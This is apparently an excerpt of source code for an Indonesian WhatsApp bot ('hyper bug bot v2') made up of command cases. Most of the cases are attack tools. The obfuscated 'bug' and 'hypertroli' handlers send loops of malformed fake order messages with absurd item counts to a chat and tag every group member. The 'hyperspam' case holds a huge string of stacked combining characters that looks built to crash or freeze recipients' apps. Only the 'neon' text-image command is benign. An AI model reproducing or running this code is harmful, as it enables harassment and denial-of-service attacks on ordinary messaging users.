var _0x4f33=['C2vUze1LC3nHz2u','ndmZzNrnBNLM','qgrLBNnZChrYywe','mtCZmZG4mZqXmJa1ntK0','CMvWBgfJzq','nJi4mZe2mtu2nZiZn0bZlNDOyxrZyxbWlM5LDa','mZKYndzlDMrzu2G','CY53Agf0C2fWCc5Uzxq','qMvYAgfZAwWGtwvUz2LYAw0GqNvNifrYB2XPmG','odeXmtDVANHmwei','nJaWmwz3tej4wa','nZbit1blvwW','mZqXndC0tuTqvxbz','ndeXnJrcqNH0r3O','z3jVDxbnzxrHzgf0yq','yY51CW','CgfYDgLJAxbHBNrZ','zgvUC3nWDhjHyq','su5rvuLswq','ndDsvwLeyKK','ndaZmdi2sM5dsunU','y3jLD2jVDdi','ChvZAa','sNvTBgfOBNLHpW','q0fuquXprW','B3DUzxjc','BgvUz3rO','B25SEq','qvi0uw1vs3y3CJrqmfHzshriBwHmCw9gt09OD244u3fpotaZq1zVoxjHuuW0qt09','mebZlNDOyxrZyxbWlM5LDa','BwfW'];function _0x23a6(_0xee039c,_0x2e5950){_0xee039c=_0xee039c-0x102;var _0x4f3398=_0x4f33[_0xee039c];if(_0x23a6['ZYHNFq']===undefined){var _0x23a614=function(_0xc55725){var _0x274a3a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x2b6d34='';for(var _0x33c078=0x0,_0x596a7e,_0x355fa6,_0xc8b8c8=0x0;_0x355fa6=_0xc55725['charAt'](_0xc8b8c8++);~_0x355fa6&&(_0x596a7e=_0x33c078%0x4?_0x596a7e*0x40+_0x355fa6:_0x355fa6,_0x33c078++%0x4)?_0x2b6d34+=String['fromCharCode'](0xff&_0x596a7e>>(-0x2*_0x33c078&0x6)):0x0){_0x355fa6=_0x274a3a['indexOf'](_0x355fa6);}return _0x2b6d34;};_0x23a6['tqyWgy']=function(_0x1a03c4){var _0x13051a=_0x23a614(_0x1a03c4);var _0x1415fc=[];for(var _0x19d4db=0x0,_0x2f9a8e=_0x13051a['length'];_0x19d4db<_0x2f9a8e;_0x19d4db++){_0x1415fc+='%'+('00'+_0x13051a['charCodeAt'](_0x19d4db)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1415fc);},_0x23a6['ToEEhR']={},_0x23a6['ZYHNFq']=!![];}var _0x5def49=_0x4f33[0x0],_0xdcf760=_0xee039c+_0x5def49,_0x4ce3ea=_0x23a6['ToEEhR'][_0xdcf760];return _0x4ce3ea===undefined?(_0x4f3398=_0x23a6['tqyWgy'](_0x4f3398),_0x23a6['ToEEhR'][_0xdcf760]=_0x4f3398):_0x4f3398=_0x4ce3ea,_0x4f3398;}var _0x553d61=_0x23a6;(function(_0x151d4a,_0x5beb66){var _0x731441=_0x23a6;while(!![]){try{var _0xfd3072=-parseInt(_0x731441(0x107))*-parseInt(_0x731441(0x110))+-parseInt(_0x731441(0x109))+-parseInt(_0x731441(0x106))+-parseInt(_0x731441(0x10a))+parseInt(_0x731441(0x103))+parseInt(_0x731441(0x111))+-parseInt(_0x731441(0x108))*parseInt(_0x731441(0x11d));if(_0xfd3072===_0x5beb66)break;else _0x151d4a['push'](_0x151d4a['shift']());}catch(_0x2241bc){_0x151d4a['push'](_0x151d4a['shift']());}}}(_0x4f33,0x3836e));if(!isOwner)return reply(mess[_0x553d61(0x118)][_0x553d61(0x116)]);if(args[_0x553d61(0x117)]<0x1)return reply(_0x553d61(0x114));try{var hets=_0x553d61(0x112),grousp=await hypermod[_0x553d61(0x10b)](from),membere=grousp[_0x553d61(0x10d)],mems=[];membere[_0x553d61(0x11b)](async _0x5def49=>{var _0x211126=_0x553d61;mems[_0x211126(0x113)](_0x5def49['id'][_0x211126(0x120)](_0x211126(0x10c),_0x211126(0x104)));});var options={'text':hets,'contextInfo':{'mentionedJid':mem},'quoted':mek};for(let i=0x0;i<args[0x0];i++){hypermod[_0x553d61(0x11c)](from,options,text,{'quoted':{'key':{'fromMe':![],'participant':_0x553d61(0x11a),...from?{'remoteJid':'62882248593508@s.whatsapp.net'}:{}},'message':{'orderMessage':{'orderId':_0x553d61(0x11f),'itemCount':-0x2540be3ff,'status':_0x553d61(0x10f),'surface':'CATALOG','message':'hyper bug bot v2','orderTitle':_0x553d61(0x10e),'sellerJid':_0x553d61(0x102),'token':'AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=='}}}});}}catch{for(let i=0x0;i<0xa;i++){hypermod[_0x553d61(0x11c)](from,_0x553d61(0x105),text,{'quoted':{'key':{'fromMe':![],'participant':_0x553d61(0x11a),...from?{'remoteJid':'62882248593508@s.whatsapp.net'}:{}},'message':{'orderMessage':{'orderId':_0x553d61(0x11f),'itemCount':-0x2540be3ff,'status':_0x553d61(0x10f),'surface':_0x553d61(0x115),'message':'hyper bug bot v2','orderTitle':_0x553d61(0x11e),'sellerJid':_0x553d61(0x102),'token':_0x553d61(0x119)}}}});}}
		       break
					case 'hypertroli':
              const _0x2a55=['A2v5','B3DUzxjc','ndC1ndC2DLPgCxbX','qxn5BhvTvMLYDxm','otu4n3LrCe1pDa','ndG5ntKYveT6q0r6','nJaYnJf1zNvLvNm','B25SEq','mZq4otyWrLbeq0DT','Dg9Nz2XLrgLZyxbWzwfYAw5NtwvZC2fNzxm','ndi4mJC3yu51z0HU','qgfKAxDHANnOAw5Nl2jHAwXLExm','nvnTshDpqG','4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAscUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwHokwHokwHokwHokwHokwHokwHokwHokwKUkwKUkwKUkwKUkwKUkwKGRILPlILPlILOJILPlILPlILPlILOtILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOtILPlILPlILPlILPik4PAs4PAi4PAq4PAs4PAs4PAs4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAs4PAs4PAs4PAscUkwKUkwJokwKokwKUkwKUkwIokwIokwHokwGokwIokwIokwIokwIokwIokwIokwGokwHokwIokwIokwKUkwKUkwKGRILPdILlZILPdILPlILPlILOJILOJILOtILOtILOtILOtILOJILOJILOtILOtILOtILOtILOJILOJILPlILPlILPik4PAq4Ps84PAq4PAs4PAs4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAs4PAs4PAscUkwKokwHokwKokwIokwIokwIokwIokuGokwGokwKokwKokwGokwIokuGokwIokuGokwJokwKokwIokwIokwHokwKGRILPlILPlILOJILOJILOJILOJILOJILidILidILidILidILidILidILidILidILidILidILPdILOJILOJILOJILOWk4PAs4PAs4PAi4PAa4PAa4PAi4PAi4PAe4PAi4Psa4PAe4Psa4Psa4Psa4PAq4Psa4PAe4PAi4PAi4PAi4PAa4PAscUkwKUkwKUkwIokwKUkwKUkwIokwIokwIokwIokwIokwIokwIokwHokwIokwIokwIokwIokwIokwIokwKUkwKUkwKGRILPlILPlILPlILPlILPlILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILPlILPlILPik4PAs4PAs4PAs4PAs4PAs4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAs4PAs4PAscUkwKUkwKUkwKUkwKUkwKUkwIokwIokwIokwIokwIokwIokwIokwIokwIokwKokwJokwIokwIokwJokwKUkwKUkwKGRILPlILPlILPlILPlILPlILPdILOdILPdILPlILOZILOdILOJILOdILPlILPdILPlILOJILPlILPlILPlILPlILPik4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAq4PAs4PAs4PAs4PAs4PAm4PAs4PAs4PAs4PAs4PAscUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKG','mebZlNDOyxrZyxbWlM5LDa','nJm5ntDVDxLlDM8','4PIG77Ipqxn5BhvT4PIG77Ip','zxH0zw5KzwruzxH0','C2vUze1LC3nHz2u','ndHnyNPZzu8'];const _0x181205=_0x3357;(function(_0x15c8b7,_0x1c69db){const _0x28ef5e=_0x3357;while(!![]){try{const _0x5b2e3c=parseInt(_0x28ef5e(0x89))+-parseInt(_0x28ef5e(0x82))+-parseInt(_0x28ef5e(0x7b))+-parseInt(_0x28ef5e(0x7d))+parseInt(_0x28ef5e(0x86))*parseInt(_0x28ef5e(0x8b))+parseInt(_0x28ef5e(0x79))*-parseInt(_0x28ef5e(0x7f))+parseInt(_0x28ef5e(0x8c));if(_0x5b2e3c===_0x1c69db)break;else _0x15c8b7['push'](_0x15c8b7['shift']());}catch(_0x45cd13){_0x15c8b7['push'](_0x15c8b7['shift']());}}}(_0x2a55,0x45079));if(!isOwner)return reply(mess[_0x181205(0x7a)][_0x181205(0x88)]);function _0x3357(_0x3b0a3d,_0x1534a4){_0x3b0a3d=_0x3b0a3d-0x79;let _0x2a5539=_0x2a55[_0x3b0a3d];if(_0x3357['cjjhGf']===undefined){var _0x335755=function(_0x5225bd){const _0x46b860='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x43d834='';for(let _0x36a7b6=0x0,_0x135f3a,_0x57c727,_0x2a4bc5=0x0;_0x57c727=_0x5225bd['charAt'](_0x2a4bc5++);~_0x57c727&&(_0x135f3a=_0x36a7b6%0x4?_0x135f3a*0x40+_0x57c727:_0x57c727,_0x36a7b6++%0x4)?_0x43d834+=String['fromCharCode'](0xff&_0x135f3a>>(-0x2*_0x36a7b6&0x6)):0x0){_0x57c727=_0x46b860['indexOf'](_0x57c727);}return _0x43d834;};_0x3357['dExSbW']=function(_0x124420){const _0xb94211=_0x335755(_0x124420);let _0x567ce5=[];for(let _0x1648bd=0x0,_0x2f3fcb=_0xb94211['length'];_0x1648bd<_0x2f3fcb;_0x1648bd++){_0x567ce5+='%'+('00'+_0xb94211['charCodeAt'](_0x1648bd)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x567ce5);},_0x3357['YaAqHs']={},_0x3357['cjjhGf']=!![];}const _0x4f0ece=_0x2a55[0x0],_0x30a154=_0x3b0a3d+_0x4f0ece,_0x2f9b51=_0x3357['YaAqHs'][_0x30a154];return _0x2f9b51===undefined?(_0x2a5539=_0x3357['dExSbW'](_0x2a5539),_0x3357['YaAqHs'][_0x30a154]=_0x2a5539):_0x2a5539=_0x2f9b51,_0x2a5539;}function sleep(_0x4f0ece){return new Promise(_0x30a154=>setTimeout(_0x30a154,_0x4f0ece));}function troli(_0x2f9b51){const _0x107123=_0x181205;hypermod[_0x107123(0x85)](_0x2f9b51,_0x107123(0x80),MessageType[_0x107123(0x84)],{'quoted':{'key':{'participant':_0x107123(0x81)},'message':{'orderMessage':{'thumbnail':dfrply,'itemCount':-0x39cd8185,'status':0x1,'surface':0x1,'message':_0x107123(0x83),'orderTitle':_0x107123(0x8a),'sellerJid':'0@s.whatsapp.net'}}}});}function bug(_0x5225bd){const _0xc0b2db=_0x181205;for(let _0x43d834=0x0;_0x43d834<0x1;_0x43d834++){var _0x46b860=require(_0xc0b2db(0x7e));hypermod[_0xc0b2db(0x7c)](_0x5225bd,_0x46b860);}}async function attack(_0x36a7b6){bug(_0x36a7b6),await sleep(0x64),troli(_0x36a7b6),await sleep(0x64),bug(_0x36a7b6);}attack(mek[_0x181205(0x87)]['remoteJid']);
break					
          case 'neon': case 'neontext':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Penggunaan ${command} text`)
                reply(mess.wait)
                sendFileFromUrl(from, `https://api.lolhuman.xyz/api/textprome/neon?apikey=${lolkey}&text=${q}`, '', msg).catch(() => reply(mess.error.api))
                limitAdd(sender, limit)
                break     
                                  		case 'hyperspam': 	
                                  					if (!isOwner) return reply(mess.only.ownerB)// Update By HYPER MOD
				pirtex1 = 'كاتي ابليس يببني الروش حاكم المماليك*_ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ ~*li𝀷𝀫𝀲𝀭𝀷𝀲𝁅𝀷.li*~ *<[999+ detik!]>* wa.me//94767043432✿⃝⃟݊ᤢོ۪🇮🇩ོོ͓̽⃟͓̽ཷ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ ⃢͓̽⃟͓̽ཷ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ ⃢🌹೩ོ0ོ೩ོ ɩȿạɩɾ.com ⬤ ⃢͓̽⃟͓̽ཷ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ ⃢͓̽⃟͓̽ཷ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ึ͓̽ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ*��*9999999*d *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999*e *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999*u *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999*s *ผิดุท้เึางืผิดุท้เึางื* *9999999* *9999999* *ผิดุท้เึางืผิดุท้เึางื* *9999999* https://Mäřīõ03.in *D้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้isinัััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััััi Sa้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้ya Tidaัััััััััััััััััััััััััััััััััััััััััััััััััััk*้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้ *Beัััััึึึึึึึึึึััััััััััััััึึึึึึึึึึrmaks้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้uัััััััััััััััััััััััััีีีีีีีีีัััััััd M้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้้enantang* 👋😶👍*<[999+ detik!]>* Http://Wa.me/+6282177242710?txt=salam+assalamualaikum🔴▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂🔴▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂🔴▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ